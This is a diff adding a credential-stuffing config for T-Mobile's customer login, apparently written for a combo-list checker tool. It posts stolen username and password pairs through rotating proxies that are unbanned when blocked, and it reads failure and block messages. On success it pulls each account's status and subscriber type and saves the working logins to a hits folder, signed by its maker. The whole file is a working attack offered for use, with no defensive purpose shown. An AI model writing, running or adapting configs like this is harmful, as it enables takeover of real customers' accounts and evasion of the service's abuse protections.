@@ -1,0 +1,63 @@
+[General]
+UseProxy = True
+UseGlobalKeywords = True
+DefaultTimeout = 20
+UnbanAllProxiesWhenAllBannedAfter = 0.1
+HitsFolderName = Gui.t-mobile_Hits
+
+[Stage-1]
+Condition = Any
+Variable-1 = $Link1 = "https://gui.t-mobile.com/gui/login?client_id=WRCMAV_STG&scope=associated_lines TMO_ID_profile token_validation permission&response_type=code&access_type=OFFLINE&redirect_uri=https://wrgweb2.phi.t-mobile.com/reg_srv&state=https://wrc.t-mobile.com/wrcpro/home.html"
+Link = $Link1#
+isFTP = False
+HTTPVersion = 1.1
+Headers = $Heads1#
+FollowRedirect = False
+HTTPRequestMethod = GET
+Timeout = 20
+Variable-2 = $Heads1 = "Host: gui.t-mobile.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept: */*\nAccept-Language: en-USchr(Comma)en;q=0.8\nConnection: keep-alive\nUpgrade-Insecure-Requests: 1"
+Variable-3 = $Cookie = findtagval($Stage1ResponseHeader#, "Set-Cookie: JSESSIONID=", ";")
+Variable-4 = $CondUrl2 = len($Cookie#) > 0
+Ban-Condition = indexof($Stage1ResponseHeader#, "Set-Cookie: JSESSIONID=") < 0
+
+[Stage-2]
+Condition = $CondUrl2#
+Variable-1 = $Link2 = "https://gui.t-mobile.com/gui/auth"
+Link = $Link2#
+isFTP = False
+HTTPVersion = 1.1
+FollowRedirect = True
+HTTPRequestMethod = POST
+Variable-2 = $Heads2 = "Accept: text/htmlchr(Comma)application/xhtml+xmlchr(Comma)application/xml;q=0.9chr(Comma)*/*;q=0.8\nReferer: https://gui.t-mobile.com/gui/login?client_id=WRCMAV_STG&scope=associated_lines TMO_ID_profile token_validation permission&response_type=code&access_type=OFFLINE&redirect_uri=https://wrgweb2.phi.t-mobile.com/reg_srv&state=https://wrc.t-mobile.com/wrcpro/home.html\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:61.0) Gecko/20100101 Firefox/61.0\nHost: gui.t-mobile.com\nPragma: no-cache\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded"
+Headers = $Heads2#
+Variable-3 = $PostContent = combinetext("email=", urlencode($ComboUsername#), "&password=", $ComboPassword#, "&clientId=WRCMAV_STG&scope=associated_lines+TMO_ID_profile+token_validation+permission&responseType=code&redirectUri=https%3A%2F%2Fwrgweb2.phi.t-mobile.com%2Freg_srv&ref=https%3A%2F%2Fgui.t-mobile.com%2Fgui%2Flogin%3Fclient_id%3DWRCMAV_STG%26scope%3Dassociated_lines%2520TMO_ID_profile%2520token_validation%2520permission%26response_type%3Dcode%26access_type%3DOFFLINE%26redirect_uri%3Dhttps%253A%252F%252Fwrgweb2.phi.t-mobile.com%252Freg_srv%26state%3Dhttps%3A%2F%2Fwrc.t-mobile.com%2Fwrcpro%2Fhome.html&state=https%3A%2F%2Fwrc.t-mobile.com%2Fwrcpro%2Fhome.html&accessType=OFFLINE")
+PostContent = $PostContent#
+Variable-4 = $Failkey1 = "The login information you provided is incorrect."
+Variable-5 = $IndexOfFailkey1 = indexof($Stage2ResponseSource#, $Failkey1#)
+Variable-6 = $Failkey2 = "Your account has been blocked."
+Variable-7 = $IndexOfFailkey2 = indexof($Stage2ResponseSource#, $Failkey2#)
+Variable-8 = $Failkey3 = "500 Internal Server Error"
+Variable-9 = $IndexOfFailkey3 = indexof($Stage2ResponseHeader#, $Failkey3#)
+Variable-10 = $SessionId = findtagval($Stage2ResponseHeader#, "sessionId=", "&")
+Variable-11 = $ClientId = findtagval($Stage2ResponseHeader#, "clientId=", "&")
+Variable-12 = $CondUrl3 = indexof($Stage2ResponseHeader#, "clientId=") >= 0
+
+Failure-Condition = $IndexOfFailkey1# >= 0 || $IndexOfFailkey2# >= 0 || $IndexOfFailkey3# >= 0
+
+[Stage-3]
+Condition = $CondUrl3#
+isFTP = False
+HTTPVersion = 1.1
+FollowRedirect = False
+HTTPRequestMethod = GET
+Timeout = 20
+Variable-1 = $Link3 = combinetext("https://wrc.t-mobile.com/wrcpro/homeData.html?sessionId=", $SessionId#, "&nodeFqdn=wrgweb2.phi.t-mobile.com&clientId=", $ClientId#)
+Link = $Link3#
+Variable-2 = $Heads3 = combinetext("Accept: application/jsonchr(Comma) text/plainchr(Comma) */*\nReferer: https://gui.t-mobile.com/gui/login?client_id=WRCMAV_STG&scope=associated_lines TMO_ID_profile token_validation permission&response_type=code&access_type=OFFLINE&redirect_uri=https://wrgweb2.phi.t-mobile.com/reg_srv&state=https://wrc.t-mobile.com/wrcpro/home.html\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:61.0) Gecko/20100101 Firefox/61.0\nHost: wrc.t-mobile.com\nPragma: no-cache\nConnection: keep-alive\nX-Session-ID: ", $SessionId#, "\nX-Client-ID: ", $ClientId#)
+Headers = $Heads3#
+Variable-3 = $IndexOfSuccKey = indexof($Stage3ResponseSource#, "accountStatuschr(double quotes):chr(double quotes)Activechr(double quotes)")
+Variable-4 = $Capture1 = findtagval($stage3responseSource#,"accountStatuschr(double quotes):chr(double quotes)","chr(double quotes)")
+Variable-5 = $Capture2 = findtagval($stage3responseSource#,"subscriberTypechr(double quotes):chr(double quotes)","chr(double quotes)")
+Variable-6 = $SaveFormat = combinetext($ComboUsername#, ":", $ComboPassword#, "\nStatus: ",$Capture1#, "\nSubscriber Type: ",$Capture2#, "\nMaker: kill3ryou")
+
+Success-Condition = $IndexOfSuccKey# >= 0
